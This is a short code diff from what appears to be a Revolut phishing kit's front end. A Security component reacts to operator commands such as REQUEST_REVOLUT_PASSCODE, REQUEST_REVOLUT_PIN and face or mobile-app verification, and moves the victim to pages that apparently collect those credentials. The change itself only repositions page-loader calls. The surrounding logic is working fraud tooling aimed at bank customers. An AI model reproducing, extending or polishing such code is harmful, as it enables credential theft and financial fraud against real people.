@@ -71,9 +71,9 @@ export default function Security() {
             console.log("HERE WE WILL REQUEST REVOLUT PASSCODE AGAIN");
             displayErrorModal('passcode'); // Show error modal for passcode
         } else if (command === 'REQUEST_REVOLUT_PIN') {
+            displayPageLoader();
             setTimeout(() => {
                 console.log("HERE WE WILL PUSH TO PIN PAGE");
-                displayPageLoader();
                 router.push('/PasswordPage');
             }, 3500);
         } else if (command === 'REQUEST_REVOLUT_PIN_AGAIN') {
@@ -88,11 +88,13 @@ export default function Security() {
         } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION_AGAIN') {
             // displayErrorModal('face_verification'); // Show error modal for face verification
         } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
+            displayPageLoader();
             setTimeout(() => {
                 console.log("HERE WE WILL PUSH TO MOBILE APP VERIFICATION PAGE");
                 router.push('/MobileAuthPAge');
             }, 3500);
         } else if (command === 'FINISH') {
+            displayPageLoader();
             setTimeout(() => {
                 resetCommand(); 
                 router.push('/verificationPage');
